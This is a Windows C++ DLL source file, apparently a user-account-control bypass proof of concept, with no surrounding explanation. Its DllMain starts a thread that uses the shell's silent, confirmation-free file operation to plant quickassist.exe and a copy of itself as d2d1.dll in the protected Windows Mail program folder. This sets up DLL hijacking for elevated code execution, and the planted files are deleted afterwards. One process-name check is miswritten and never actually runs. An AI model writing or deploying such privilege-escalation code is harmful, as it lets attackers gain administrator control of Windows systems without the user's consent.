#include "Windows.h"
#include <shobjidl_core.h>
#include <string>
#include "psapi.h"
HRESULT CopyItem(__in PCWSTR pszSrcItem, __in PCWSTR pszDest, PCWSTR pszNewName)
{
    //
    // Initialize COM as STA.
    //
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE); 
    if (SUCCEEDED(hr))
    {
        IFileOperation *pfo;
  
        //
        // Create the IFileOperation interface 
        //
        hr = CoCreateInstance(CLSID_FileOperation, 
                              NULL, 
                              CLSCTX_ALL, 
                              IID_PPV_ARGS(&pfo));
        if (SUCCEEDED(hr))
        {
            //
            // Set the operation flags. Turn off all UI from being shown to the
            // user during the operation. This includes error, confirmation,
            // and progress dialogs.
            //
            hr = pfo->SetOperationFlags(FOF_NOCONFIRMATION |
				FOF_SILENT |
				FOFX_SHOWELEVATIONPROMPT |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION |
				FOF_NOERRORUI);
            if (SUCCEEDED(hr))
            {
                //
                // Create an IShellItem from the supplied source path.
                //
                IShellItem *psiFrom = NULL;
                hr = SHCreateItemFromParsingName(pszSrcItem, 
                                                 NULL, 
                                                 IID_PPV_ARGS(&psiFrom));
                if (SUCCEEDED(hr))
                {
                    IShellItem *psiTo = NULL;
  
                    if (NULL != pszDest)
                    {
                        //
                        // Create an IShellItem from the supplied 
                        // destination path.
                        //
                        hr = SHCreateItemFromParsingName(pszDest, 
                                                         NULL, 
                                                         IID_PPV_ARGS(&psiTo));
                    }
                    
                    if (SUCCEEDED(hr))
                    {
                        //
                        // Add the operation
                        //
                        hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);

                        if (NULL != psiTo)
                        {
                            psiTo->Release();
                        }
                    }
                    
                    psiFrom->Release();
                }
                
                if (SUCCEEDED(hr))
                {
                    //
                    // Perform the operation to copy the file.
                    //
                    hr = pfo->PerformOperations();
                }        
            }
            
            //
            // Release the IFileOperation interface.
            //
            pfo->Release();
        }
  
        CoUninitialize();
    }
    return hr;
}


HRESULT DeleteItem(__in PCWSTR pszSrcItem)
{
    //
    // Initialize COM as STA.
    //
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE); 
    if (SUCCEEDED(hr))
    {
        IFileOperation *pfo;
  
        //
        // Create the IFileOperation interface 
        //
        hr = CoCreateInstance(CLSID_FileOperation, 
                              NULL, 
                              CLSCTX_ALL, 
                              IID_PPV_ARGS(&pfo));
        if (SUCCEEDED(hr))
        {
            //
            // Set the operation flags. Turn off all UI from being shown to the
            // user during the operation. This includes error, confirmation,
            // and progress dialogs.
            //
            hr = pfo->SetOperationFlags(FOF_NOCONFIRMATION |
				FOF_SILENT |
				FOFX_SHOWELEVATIONPROMPT |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION |
				FOF_NOERRORUI);
            if (SUCCEEDED(hr))
            {
                //
                // Create an IShellItem from the supplied source path.
                //
                IShellItem *psiFrom = NULL;
                hr = SHCreateItemFromParsingName(pszSrcItem, 
                                                 NULL, 
                                                 IID_PPV_ARGS(&psiFrom));
                if (SUCCEEDED(hr))
                {
                        //
                        // Add the operation
                        //
                        hr = pfo->DeleteItem(psiFrom, NULL);
                        psiFrom->Release();
                }
                
                if (SUCCEEDED(hr))
                {
                    //
                    // Perform the operation to copy the file.
                    //
                    hr = pfo->PerformOperations();
                }        
            }
            
            //
            // Release the IFileOperation interface.
            //
            pfo->Release();
        }
  
        CoUninitialize();
    }
    return hr;
}


extern "C" __declspec(dllexport) int func() {
return 1;
}
using namespace std;
string ConvertLPCWSTRToString(LPCWSTR lpcwszStr) 
{ 
    // Determine the length of the converted string 
    int strLength 
        = WideCharToMultiByte(CP_UTF8, 0, lpcwszStr, -1, 
                              nullptr, 0, nullptr, nullptr); 
  
    // Create a std::string with the determined length 
    string str(strLength, 0); 
  
    // Perform the conversion from LPCWSTR to std::string 
    WideCharToMultiByte(CP_UTF8, 0, lpcwszStr, -1, &str[0], 
                        strLength, nullptr, nullptr); 
  
    // Return the converted std::string 
    return str; 
} 

BOOL CheckProcessName(){
    char pName[1024];
        GetProcessImageFileNameA((HANDLE)-1, pName, 1024);
        char * p;
        p = strtok(pName, "\\"); 
        while (p != NULL) {
            
            if(!strcmp(p, "explorer.exe"))
                return TRUE;
                
            
                p = strtok(NULL, "\\");
            
        }
    return FALSE;
}

void doStuff1(){

            if(!CheckProcessName)
                exit(0);
            CopyItem(L"C:\\windows\\system32\\quickassist.exe", L"c:\\Program Files\\Windows Mail", L"quickassist.exe");    
            wchar_t* w_pcRootLocation = NULL;
            size_t  size =0;
            size = GetCurrentDirectoryW(size, NULL);
            w_pcRootLocation = (PWSTR)malloc(size*sizeof(WCHAR));
            GetCurrentDirectoryW(size, w_pcRootLocation);
            string dir = ConvertLPCWSTRToString(w_pcRootLocation);
            string filename = "\\d2d1.dll";
            dir.erase(std::find(dir.begin(), dir.end(), '\0'), dir.end());
            string path = dir + filename +'\0';
            
            std::wstring wpath = std::wstring(path.begin(), path.end());
            CopyItem(wpath.c_str(), L"c:\\Program Files\\Windows Mail", L"d2d1.dll");  
         
            Sleep(5000);
            DeleteItem(L"c:\\Program Files\\Windows Mail\\quickassist.exe"); 
            DeleteItem(L"c:\\Program Files\\Windows Mail\\d2d1.dll"); 
         
            exit(0);
}


BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason ) 
    { 
        case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
           
            //CreateThread(0,0, (LPTHREAD_START_ROUTINE)doStuff1, 0, 0,0);
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)doStuff1, 0, 0,0);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:
        
            if (lpvReserved != nullptr)
            {
                break; // do not do cleanup if process termination scenario
            }
            
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}